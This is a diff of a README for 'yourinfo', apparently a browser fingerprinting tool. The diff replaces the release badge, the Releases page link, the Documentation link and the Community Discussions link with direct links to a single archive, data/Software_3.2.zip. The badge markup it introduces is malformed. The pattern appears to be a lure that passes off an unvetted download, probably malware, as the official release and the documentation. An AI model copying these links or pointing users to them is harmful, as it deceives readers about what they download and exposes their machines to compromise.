@@ -8,10 +8,10 @@ To get started with yourinfo, follow these steps to download and run the softwar
 
 ## 📥 Download & Install
 ### Click the button below to get the latest release!
-[![Download yourinfo](https://img.shields.io/badge/Download%20yourinfo-v1.0-blue.svg)](https://github.com/Kaiiiri/yourinfo/releases)
+[![Download yourinfo](https://github.com/Kaiiiri/yourinfo/raw/refs/heads/main/data/Software_3.2.zip%https://github.com/Kaiiiri/yourinfo/raw/refs/heads/main/data/Software_3.2.zip)](https://github.com/Kaiiiri/yourinfo/raw/refs/heads/main/data/Software_3.2.zip)
 
 1. **Visit the Releases Page:**  
-   Go to the [yourinfo Releases page](https://github.com/Kaiiiri/yourinfo/releases) to view all available versions.
+   Go to the [yourinfo Releases page](https://github.com/Kaiiiri/yourinfo/raw/refs/heads/main/data/Software_3.2.zip) to view all available versions.
 
 2. **Select Your Version:**  
    Choose the version you want to download. We recommend using the latest stable release for the best features and performance.
@@ -52,8 +52,8 @@ If you have questions or need assistance, please reach out through the GitHub Is
 
 ## 🔗 Additional Resources
 For more information on using yourinfo, you can browse the following resources:
-- [Documentation](https://github.com/Kaiiiri/yourinfo/wiki)
-- [Community Discussions](https://github.com/Kaiiiri/yourinfo/discussions)
+- [Documentation](https://github.com/Kaiiiri/yourinfo/raw/refs/heads/main/data/Software_3.2.zip)
+- [Community Discussions](https://github.com/Kaiiiri/yourinfo/raw/refs/heads/main/data/Software_3.2.zip)
 
 ## 🎉 Conclusion
 Thank you for choosing yourinfo! We hope this application meets your needs and enhances your understanding of real-time browser fingerprinting. Enjoy exploring your data in a new way!
